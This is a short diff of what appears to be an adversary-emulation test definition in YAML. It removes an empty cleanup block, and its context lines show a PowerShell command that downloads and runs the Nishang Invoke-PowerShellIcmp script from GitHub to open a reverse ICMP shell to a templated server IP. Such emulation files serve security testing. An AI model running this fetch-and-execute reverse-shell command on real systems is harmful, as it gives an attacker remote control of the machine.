@@ -22,6 +22,3 @@ steps:
         IEX (New-Object System.Net.WebClient).Downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/Shells/Invoke-PowerShellIcmp.ps1')
         Invoke-PowerShellIcmp -IPAddress {{.Args.server_ip}}
       executor: powershell
-      cleanup:
-        inline: ""
-        executor: powershell
